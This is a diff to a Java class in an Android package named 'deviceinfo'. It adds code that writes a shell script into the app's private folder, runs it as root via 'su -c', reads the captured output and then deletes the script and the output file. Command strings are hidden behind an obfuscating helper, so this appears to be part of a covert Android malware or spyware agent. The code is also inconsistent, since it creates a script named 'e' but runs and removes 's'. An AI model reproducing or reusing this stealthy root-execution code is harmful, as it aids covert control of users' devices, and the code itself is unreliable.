@@ -9,15 +9,17 @@ import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.TimeoutException;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Directory;
 import com.android.m.M;
 
 public class Execute {
 	private static final String TAG = "Execute";
-	
+
 	public static ExecuteResult executeRoot(String command) {
 		String cmd = Directory.expandMacro(command);
 
@@ -133,4 +135,51 @@ public class Execute {
 
 		return result;
 	}
+
+	public static boolean executeWaitFor(String cmd) {
+
+		try {
+			Process localProcess = Runtime.getRuntime().exec(cmd);
+			localProcess.waitFor();
+			return true;
+		} catch (Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+			return false;
+		}
+	}
+
+	public synchronized static String executeScript(String cmd) {
+		String pack = Status.self().getAppContext().getPackageName();
+
+		String script = M.e("#!/system/bin/sh") + "\n" + String.format(M.e("%s | tee /data/data/%s/files/o"), cmd, pack)
+				+ "\n";
+
+		if (Root.createScript("e", script) == true) {
+			// 32_7=/system/bin/chmod 755
+			// su -c /data/data/com.android.service/files/s
+			boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (superapkRoot) execute 2: " + String.format(M.e("su -c /data/data/%s/files/s"), pack)
+						+ " ret: " + res);
+			}
+
+			Root.removeScript("s");
+			AutoFile file = new AutoFile(String.format(M.e("/data/data/%s/files/o"), pack));
+			String ret = new String(file.read());
+			file.delete();
+			return ret;
+
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
+			}
+		}
+
+		return "";
+
+	}
+
 }
